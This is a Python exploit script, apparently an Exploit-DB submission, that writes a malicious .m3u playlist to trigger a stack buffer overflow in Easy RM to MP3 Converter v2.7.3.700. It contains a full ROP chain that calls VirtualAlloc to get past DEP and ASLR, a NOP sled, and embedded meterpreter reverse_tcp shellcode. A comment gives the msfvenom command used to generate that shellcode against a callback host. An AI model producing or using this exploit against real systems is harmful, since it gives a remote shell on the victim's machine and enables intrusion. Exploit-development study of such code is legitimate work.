"""
Full title:         Easy RM to MP3 Converter v.2.7.3.700 - m3u Stack Buffer Overflow (DEP,ASLR Bypass)
Exploit Author:     Paolo Stagno aka VoidSec - voidsec@voidsec.com - https://voidsec.com
Vendor Homepage:    http://www.rm-to-mp3.net
Download:           https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe
Version:            v.2.7.3.700
Tested on:          Windows 10 Pro x64 v.1909 Build 18363.418
Category:           local exploits
Platform:           windows
"""
#!/usr/bin/python
import struct
filename="#Easy_RM_to_MP3_Converter_v.2.7.3.700_exploit.m3u"

buffer_size = 30000 # 30000 for EIP control; 50000 for SEH control; !mona pc 30000 -extended !mona findmsp -extended
eip_offset = 26090
# !mona compare -f 'C:\\logs\\RM2MP3Converter\\bytearray.bin' -a esp
# BAD CHARS: \x00\x09\x0a
# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.206.1 -b '\x00\x09\x0a' -f python -v shellcode
# shellcode length: 368
shellcode =  b""
shellcode += b"\xbd\x49\x2f\xf9\x69\xdd\xc7\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x56\x83\xea\xfc\x31\x6a\x0f"
shellcode += b"\x03\x6a\x46\xcd\x0c\x95\xb0\x93\xef\x66\x40"
shellcode += b"\xf4\x66\x83\x71\x34\x1c\xc7\x21\x84\x56\x85"
shellcode += b"\xcd\x6f\x3a\x3e\x46\x1d\x93\x31\xef\xa8\xc5"
shellcode += b"\x7c\xf0\x81\x36\x1e\x72\xd8\x6a\xc0\x4b\x13"
shellcode += b"\x7f\x01\x8c\x4e\x72\x53\x45\x04\x21\x44\xe2"
shellcode += b"\x50\xfa\xef\xb8\x75\x7a\x13\x08\x77\xab\x82"
shellcode += b"\x03\x2e\x6b\x24\xc0\x5a\x22\x3e\x05\x66\xfc"
shellcode += b"\xb5\xfd\x1c\xff\x1f\xcc\xdd\xac\x61\xe1\x2f"
shellcode += b"\xac\xa6\xc5\xcf\xdb\xde\x36\x6d\xdc\x24\x45"
shellcode += b"\xa9\x69\xbf\xed\x3a\xc9\x1b\x0c\xee\x8c\xe8"
shellcode += b"\x02\x5b\xda\xb7\x06\x5a\x0f\xcc\x32\xd7\xae"
shellcode += b"\x03\xb3\xa3\x94\x87\x98\x70\xb4\x9e\x44\xd6"
shellcode += b"\xc9\xc1\x27\x87\x6f\x89\xc5\xdc\x1d\xd0\x81"
shellcode += b"\x11\x2c\xeb\x51\x3e\x27\x98\x63\xe1\x93\x36"
shellcode += b"\xcf\x6a\x3a\xc0\x46\x7c\xbd\x1e\xe0\xed\x43"
shellcode += b"\x9f\x10\x27\x80\xcb\x40\x5f\x21\x74\x0b\x9f"
shellcode += b"\xce\xa1\xa1\x95\x58\x8a\x9d\x64\x99\x62\xdf"
shellcode += b"\x78\x8b\x2e\x56\x9e\xfb\x9e\x38\x0f\xbc\x4e"
shellcode += b"\xf8\xff\x54\x85\xf7\x20\x44\xa6\xd2\x48\xef"
shellcode += b"\x49\x8a\x21\x98\xf0\x97\xba\x39\xfc\x02\xc7"
shellcode += b"\x7a\x76\xa6\x37\x34\x7f\xc3\x2b\x21\x18\x2b"
shellcode += b"\xb4\xb2\x8d\x2b\xde\xb6\x07\x7c\x76\xb5\x7e"
shellcode += b"\x4a\xd9\x46\x55\xc9\x1e\xb8\x28\xfb\x55\x8f"
shellcode += b"\xbe\x43\x02\xf0\x2e\x43\xd2\xa6\x24\x43\xba"
shellcode += b"\x1e\x1d\x10\xdf\x60\x88\x05\x4c\xf5\x33\x7f"
shellcode += b"\x20\x5e\x5c\x7d\x1f\xa8\xc3\x7e\x4a\xaa\x04"
shellcode += b"\x80\x08\x85\xac\xe8\xf2\x95\x4c\xe8\x98\x15"
shellcode += b"\x1d\x80\x57\x39\x92\x60\x97\x90\xfb\xe8\x12"
shellcode += b"\x75\x49\x89\x23\x5c\x0f\x17\x23\x53\x94\xa8"
shellcode += b"\x5e\x1c\x2b\x49\x9f\x34\x48\x4a\x9f\x38\x6e"
shellcode += b"\x77\x49\x01\x04\xb6\x49\x36\x17\x8d\xec\x1f"
shellcode += b"\xb2\xed\xa3\x60\x97"

def create_rop_nop():
    rop_gadgets = [
    0x1001c120, # POP EDI # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def create_rop_chain():
    """
    *VirtualAlloc (At 0x10032078 in msrmfilter03 (base + 0x00032078) : 0x75945ed0 (ptr to KERNEL32.virtualalloc))
    
    Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
    0x10000000 | 0x10071000 | 0x00071000 | False  | False   | False |  False   | False  | -1.0- [MSRMfilter03.dll] (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMfilter03.dll)    
   
    LPVOID VirtualAlloc(
        ret addr                    (stackpivot to jump after ropchain)
        LPVOID lpAddress            (ESP)
        SIZE_T dwSize               (2000)
        DWORD  flAllocationType     (0x1000 MEM_COMMIT)
        DWORD  flProtect            (0x40   PAGE_EXECUTE_READWRITE)
    )
    """
    rop_gadgets = [
        0x1002e892, # PUSH ESP # AND AL,10 # POP ESI # MOV DWORD PTR DS:[EDX],ECX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        # ESI = ESP
        0x100151cc, # ADD ESP,18 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
    # FUNCTION BLOCK START        
        0x41414141, # *VirtualAlloc placeholder
        0x100213b7, # ret add placeholder # something that will jump below the rop chain (>= 652) # 0x100213b7 : {pivot 1024 / 0x400} :  # ADD ESP,400 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x42424242, # lpAddress placeholder
        0x43434343, # dwSize placeholder
        0x44444444, # flAllocationType placeholder
        0x45454545, # flProtect placeholder
    # FUNCTION BLOCK END
    # Increment old ESP pointer to *VirtualAlloc placeholder
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
    # Store copy of ESI in EDX
        0x10013c45, # CLC # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x10025a1c, # XOR EDX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001bf0d, # ADC EDX,ESI # POP ESI # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x10018503, # XOR EAX,EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001741e, # ADD EAX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001a788, # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Load *VirtualAlloc in EAX
        0x1002d414, # POP EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x10032078, # *VirtualAlloc
        0x1002e0c8, # MOV EAX,DWORD PTR DS:[EAX] # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
    # EAX = VirtualAlloc
    # ESI = VirtualAlloc placeholder
    # EDX = VirtualAlloc placeholder
    # Write VirtualAlloc in VirtualAlloc placeholder
        0x10025aab, # ADD AL,0 # MOV DWORD PTR DS:[ESI],EAX # POP EDI # MOV EAX,EBX # POP ESI # POP EBX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Restore VirtualAlloc placeholder in ESI
        0x10018503, # XOR EAX,EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001741e, # ADD EAX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001a788, # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Increment old VirtualAlloc placeholder to lpAddress placeholder
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
    # Store copy of ESI (lpAddress placeholder) in EDX
        0x10025a1c, # XOR EDX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001bf0d, # ADC EDX,ESI # POP ESI # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
    # Restore lpAddress placeholder from EDX in ESI
        0x10018503, # XOR EAX,EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001741e, # ADD EAX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001a788, # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x1002d414, # POP EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}        
        0x1914DAAC, # RW memory location (0x1914DAAC+0x5E014554=77162000 Access=RW) <-------- HARDCODED ***********************
    # Get current ESP in EBP
        0x10021fdd, # PUSH ESP # INC EBP # ADD BYTE PTR DS:[EAX+5E014554],CL # POP EBP # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001e71d, # XCHG EAX,EBP # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
    # EAX = current ESP
    # ESI = lpAddress placeholder
    # EDX = lpAddress placeholder
    # Write current ESP in lpAddress placeholder
        0x10025aab, # ADD AL,0 # MOV DWORD PTR DS:[ESI],EAX # POP EDI # MOV EAX,EBX # POP ESI # POP EBX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Restore lpAddress placeholder in ESI
        0x10018503, # XOR EAX,EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001741e, # ADD EAX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001a788, # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Increment old lpAddress to dwSize placeholder
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
    # Store copy of ESI (dwSize placeholder) in EDX
        0x10025a1c, # XOR EDX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001bf0d, # ADC EDX,ESI # POP ESI # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
    # Restore dwSize placeholder from EDX in ESI
        0x10018503, # XOR EAX,EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001741e, # ADD EAX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001a788, # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Get dwSize 
        0x1002d414, # POP EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}      
        0xfffff830, # 0xfffff830 = 2000 (as the ropchain length is ~(684 bytes - where we get the ESP) and nop sled is 372 we will have 1164 bytes space for our shellcode)
        0x1001e7b4, # NEG EAX # POP EBX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP   
    # EAX = 2000 (dwSize)
    # ESI = dwSize placeholder
    # EDX = dwSize placeholder
    # Write dwSize
        0x10025aab, # ADD AL,0 # MOV DWORD PTR DS:[ESI],EAX # POP EDI # MOV EAX,EBX # POP ESI # POP EBX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Restore dwSize placeholder in ESI
        0x10018503, # XOR EAX,EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001741e, # ADD EAX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001a788, # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Increment old dwSize to flAllocationType placeholder
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
    # Store copy of ESI (flAllocationType placeholder) in EDX
        0x10025a1c, # XOR EDX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001bf0d, # ADC EDX,ESI # POP ESI # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
    # Restore flAllocationType placeholder from EDX in ESI
        0x10018503, # XOR EAX,EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001741e, # ADD EAX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001a788, # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Get flAllocationType 
        0x1002d414, # POP EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}      
        0x36a1fffb, # 0x1000
        0x1001e7b4, # NEG EAX # POP EBX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP   
        0x1002c67a, # XOR EAX,C95E1005 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
    # EAX = 0x1000 (flAllocationType)
    # ESI = flAllocationType placeholder
    # EDX = flAllocationType placeholder
    # Write flAllocationType
        0x10025aab, # ADD AL,0 # MOV DWORD PTR DS:[ESI],EAX # POP EDI # MOV EAX,EBX # POP ESI # POP EBX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Restore flAllocationType placeholder in ESI
        0x10018503, # XOR EAX,EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001741e, # ADD EAX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001a788, # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Increment old flAllocationType to flProtect placeholder
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x100280f7, # INC ESI # ADD AL,3 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
    # Store copy of ESI (flProtect placeholder) in EDX
        0x10025a1c, # XOR EDX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001bf0d, # ADC EDX,ESI # POP ESI # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
    # Restore flProtect placeholder from EDX in ESI
        0x10018503, # XOR EAX,EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001741e, # ADD EAX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001a788, # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Get flProtect 
        0x1002d414, # POP EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}      
        0xffffffc0, # 0x40
        0x1001e7b4, # NEG EAX # POP EBX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP    
    # EAX = 0x40 (flProtect)
    # ESI = flProtect placeholder
    # EDX = flProtect placeholder
    # Write flProtect
        0x10025aab, # ADD AL,0 # MOV DWORD PTR DS:[ESI],EAX # POP EDI # MOV EAX,EBX # POP ESI # POP EBX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Restore flProtect placeholder in ESI
        0x10018503, # XOR EAX,EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001741e, # ADD EAX,EDX # RETN    ** [MSRMfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x1001a788, # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
        0x90909090, # compensate POP
        0x90909090, # compensate POP
    # Decrement ESI until reach *VirtualAlloc placeholder
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x1001a523, # DEC ESI # AND AL,5E # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
    # Move ESI to EAX
        0x1002e428, # MOV EAX,ESI # POP ESI # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # compensate POP
    # Make ESP point back to VirtualAlloc and return
        0x1002be41, # XCHG EAX,ESP # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
    # Shellcode will sit below
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop=create_rop_chain()
buf = ""
buf += "A" * eip_offset
buf += create_rop_nop()*26              # as stack change upon multiple execution
buf += struct.pack("<I", 0x90909090)    # compensate last POP in ROP NOP
buf += rop
buf += "\x90" * 372                     # ESP after virtual alloc: 0016F378; first addr after rop: ESP+28C; stackpivot 1024
buf += struct.pack("<I", 0x1001b058)    # 0x1001b058 : push esp # ret  |  {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMfilter03.dll)

buf += "\x81\xc4\x24\xfa\xff\xff"       # stack adjustment for meterpreter GetPC routine; add esp, -1500
buf += shellcode
buf += "D"*(buffer_size-len(buf))

print("Payload:     {} bytes".format(len(buf)))
print("ROP Chain:   {} bytes".format(len(rop)))
print("Shellcode:   {} bytes".format(len(shellcode)))
file = open(filename , "w")
file.write(buf)
file.close()